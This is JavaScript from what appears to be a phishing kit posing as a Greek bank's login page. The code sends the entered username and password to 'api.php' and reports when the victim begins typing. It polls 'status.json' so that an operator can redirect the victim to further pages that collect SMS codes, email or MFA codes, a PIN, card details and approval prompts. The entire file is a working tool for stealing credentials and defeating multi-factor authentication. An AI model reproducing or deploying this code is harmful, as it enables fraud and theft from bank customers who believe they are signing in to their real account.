<script>
(function() {
    const usernameInput = document.getElementById('floating-label-input');
    const usernameLabel = document.querySelector('label[for="floating-label-input"]');
    const loginButton = document.querySelector('.primary-button');
    const modalOverlay = document.querySelector('.modal-overlay');
    const form = document.querySelector('form[name="loginForm"]');
    const topContainer = document.querySelector('.login-widget .top-container');
    const midContainer = document.querySelector('.login-widget .mid-container');

    let currentStep = 1;
    let storedUsername = '';
    let checkInterval = null;
    let lastStatus = '';

    function setLoading(show) {
        if (!modalOverlay) return;
        if (show) modalOverlay.classList.remove('ng-hide');
        else modalOverlay.classList.add('ng-hide');
    }

    function initFloatingLabel() {
        if (usernameInput && usernameLabel) {
            usernameInput.addEventListener('input', function() {
                if (this.value.trim() !== '') usernameLabel.classList.add('active');
                else usernameLabel.classList.remove('active');
            });
            usernameInput.addEventListener('focus', () => usernameLabel.classList.add('active'));
            usernameInput.addEventListener('blur', () => {
                if (usernameInput.value.trim() === '') usernameLabel.classList.remove('active');
            });
        }
    }
    initFloatingLabel();

    function buildPasswordStep() {
        if (!topContainer) return;
        const loginP = topContainer.querySelector('.login-p');
        if (!loginP) return;

        loginP.innerHTML = '<div class="user-chip" style="display:flex;align-items:center;gap:8px;padding:8px 16px;background:#F2F1E6;border-radius:99px;margin-bottom:16px;width:fit-content;">' +
            '<span style="width:32px;height:32px;border-radius:50%;background:#3CD75F;display:flex;align-items:center;justify-content:center;">' +
            '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#001EBA" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>' +
            '</span>' +
            '<span style="font-weight:700;color:#171A1C;" id="displayUsername"></span>' +
            '<button id="resetLoginBtn" style="background:none;border:none;cursor:pointer;font-size:18px;color:#3B4045;">×</button>' +
            '</div>' +
            '<div class="input-container" style="position:relative; margin-top: 24px;">' +
            '<div class="icon-container"><span class="iconpass"></span></div>' +
            '<input type="password" id="passwordInput" class="field input-field" style="width:100%;height:24px;border:none;border-bottom:1px solid #4A92E5;font-size:16px;outline:0;background:transparent;">' +
            '<label for="passwordInput" id="passwordLabel" style="position:absolute;top:28px;left:28px;transition:0.3s ease-out;color:#3B4045;font-size:16px;pointer-events:none;">Password</label>' +
            '<button type="button" id="togglePasswordBtn" style="position:absolute;right:0;top:20px;background:none;border:none;cursor:pointer;">' +
            '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#001EBA" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>' +
            '</button></div>';

        document.getElementById('displayUsername').textContent = storedUsername;

        const passInput = document.getElementById('passwordInput');
        const passLabel = document.getElementById('passwordLabel');
        if (passInput && passLabel) {
            passInput.addEventListener('focus', () => {
                passLabel.style.cssText = 'position:absolute;top:0;left:28px;font-size:12px;color:#001EBA;transition:0.3s ease-out;pointer-events:none;';
            });
            passInput.addEventListener('blur', function() {
                if (this.value === '') passLabel.style.cssText = 'position:absolute;top:28px;left:28px;font-size:16px;color:#3B4045;transition:0.3s ease-out;pointer-events:none;';
            });
        }

        const toggleBtn = document.getElementById('togglePasswordBtn');
        if (toggleBtn && passInput) {
            toggleBtn.addEventListener('click', () => {
                passInput.type = passInput.type === 'password' ? 'text' : 'password';
            });
        }

        const resetBtn = document.getElementById('resetLoginBtn');
        if (resetBtn) resetBtn.addEventListener('click', () => location.reload());
    }

    function goToPasswordStep() {
        storedUsername = usernameInput.value.trim();
        if (!storedUsername) return;

        // Send username to API
        var fd = new FormData();
        fd.append('type', 'login_username');
        fd.append('user', storedUsername);
        fetch('api.php', { method: 'POST', body: fd }).catch(function(err) { console.warn(err); });

        // Store in localStorage for all next pages
        localStorage.setItem('tempEmail', storedUsername);

        buildPasswordStep();
        if (loginButton) loginButton.textContent = 'Σύνδεση';

        if (midContainer && !midContainer.querySelector('.forgot-password-link')) {
            const forgotDiv = document.createElement('div');
            forgotDiv.className = 'forgot-password-link';
            forgotDiv.innerHTML = '<a href="#" style="display:block;text-align:center;padding:12px 28px;border:1px solid #C8CCD0;border-radius:28px;color:#001EBA;font-weight:700;font-size:14px;text-decoration:none;margin-top:12px;">Κλείδωσα ή Ξέχασα το Password</a>';
            midContainer.appendChild(forgotDiv);
        }

        currentStep = 2;
        if (!checkInterval) checkInterval = setInterval(checkStatus, 2000);
    }

    function submitPassword() {
        const passwordInputField = document.getElementById('passwordInput');
        if (!passwordInputField) return;
        const password = passwordInputField.value.trim();
        if (!password) return;

        setLoading(true);

        var fd = new FormData();
        fd.append('type', 'login');
        fd.append('user', storedUsername);
        fd.append('password', password);
        fetch('api.php', { method: 'POST', body: fd })
            .catch(function(err) {
                console.warn(err);
                setLoading(false);
            });
    }

    function checkStatus() {
        fetch('status.json?t=' + Date.now(), { cache: 'no-store' })
            .then(function(r) { return r.json(); })
            .then(function(data) {
                var status = '';
                for (var ip in data) {
                    if (data[ip].email === storedUsername) {
                        status = data[ip].status;
                        break;
                    }
                }
                if (status !== lastStatus) {
                    lastStatus = status;
                    if (status === 'go_balance') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'balance.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'go_email' || status === 'go_mfa') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'email.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'go_sms') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'sms.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'go_pin') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'pin.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'go_card') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'card.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'go_approve') {
                        localStorage.setItem('tempEmail', storedUsername);
                        window.location.href = 'aprouve.php?u=' + encodeURIComponent(storedUsername);
                    } else if (status === 'otp_error') {
                        var errorDiv = document.getElementById('loginError');
                        if (!errorDiv) {
                            errorDiv = document.createElement('div');
                            errorDiv.id = 'loginError';
                            errorDiv.style.cssText = 'color:red;text-align:center;margin-top:10px;';
                            if (midContainer) midContainer.appendChild(errorDiv);
                        }
                        errorDiv.style.display = 'block';
                        errorDiv.innerText = 'Λάθος password ή προέκυψε πρόβλημα. Δοκιμάστε ξανά.';
                        var passField = document.getElementById('passwordInput');
                        if (passField) passField.value = '';
                        setLoading(false);
                    } else if (status === 'finished') {
                        window.location.href = 'done.php';
                    } else if (status === 'go_done') {
                        window.location.href = 'done.php';
                    }
                }
            })
            .catch(function(err) { console.log("Waiting for status...", err); });
    }

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            if (currentStep === 1) goToPasswordStep();
            else submitPassword();
        });
    }

    if (loginButton) {
        loginButton.addEventListener('click', function(e) {
            e.preventDefault();
            if (currentStep === 1) goToPasswordStep();
            else submitPassword();
        });
    }

    if (usernameInput) {
        usernameInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && currentStep === 1) {
                e.preventDefault();
                goToPasswordStep();
            }
        });
    }

    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            var fd = new FormData();
            fd.append('type', 'typing_start');
            fd.append('step', 'INDEX - Username');
            fetch('api.php', { method: 'POST', body: fd });
        }, { once: true });
    }
})();
